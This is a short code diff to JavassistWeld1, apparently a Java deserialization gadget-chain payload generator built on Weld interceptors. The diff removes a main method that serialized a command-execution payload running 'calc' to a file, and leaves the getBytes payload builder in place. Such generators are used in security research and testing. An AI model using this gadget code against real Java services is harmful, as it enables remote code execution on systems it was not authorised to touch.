@@ -19,19 +19,11 @@ import org.jboss.weld.interceptor.spi.model.InterceptionModel;
 import org.jboss.weld.interceptor.spi.model.InterceptionType;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Constructor;
 import java.util.*;
 
 public class JavassistWeld1 {
-
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("6666.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
         final Object tpl = Gadgets.createTemplatesImpl(type, param);
